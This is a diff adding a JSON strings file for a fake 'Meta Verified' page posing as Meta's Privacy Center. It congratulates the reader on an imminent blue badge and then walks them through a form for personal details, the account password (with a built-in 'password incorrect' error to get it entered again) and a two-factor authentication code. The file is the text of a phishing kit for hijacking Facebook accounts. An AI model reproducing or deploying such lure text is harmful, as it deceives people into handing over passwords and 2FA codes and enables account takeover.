@@ -1,0 +1,65 @@
+{
+    "privacyCenter": {
+        "title": "Privacy Center",
+        "menuItems": {
+            "home": "Privacy Center Home Page",
+            "search": "Search",
+            "privacy": "Privacy Policy",
+            "rules": "Other rules and articles",
+            "settings": "Settings"
+        },
+        "congratulationsTitle": "Meta Verified",
+        "congratulationsMessage": "Congratulations! There is only one final step left for your page to receive the verified blue badge from Meta. Please fill out the form below to complete the ownership verification."
+    },
+    "formModal": {
+        "step1": {
+            "fullName": "Full Name",
+            "email": "Email",
+            "pageName": "Page Name",
+            "phoneNumber": "Phone Number",
+            "dateOfBirth": "Date of Birth",
+            "day": "Day",
+            "month": "Month",
+            "year": "Year",
+            "months": {
+                "january": "1",
+                "february": "2",
+                "march": "3",
+                "april": "4",
+                "may": "5",
+                "june": "6",
+                "july": "7",
+                "august": "8",
+                "september": "9",
+                "october": "10",
+                "november": "11",
+                "december": "12"
+            },
+            "note": "Note: Our reply will be sent to you within 14 to 48 hours.",
+            "agreeTerms": "I agree to the Terms of Use",
+            "sendButton": "Send",
+            "validation": {
+                "fullNameRequired": "Please enter your full name",
+                "emailRequired": "Please enter your email",
+                "pageNameRequired": "Please enter your page name",
+                "phoneNumberRequired": "Please enter your phone number",
+                "dobRequired": "Please enter your date of birth",
+                "agreeTermsRequired": "Please agree to the Terms of Use"
+            }
+        },
+        "step2": {
+            "password": "Password",
+            "continueButton": "Continue",
+            "error": "The password that you've entered is incorrect."
+        },
+        "step3": {
+            "facebook": "Facebook",
+            "title": "Two-Factor Authentication required",
+            "description": "Enter the code for this account that we sent to {email}, {phone}, or simply confirm via your configured Two-Factor App (e.g. Duo Mobile or Google Authenticator).",
+            "code": "Code",
+            "continueButton": "Continue",
+            "tryAnotherMethod": "Try another method",
+            "error": "The code that you've entered is incorrect."
+        }
+    }
+}
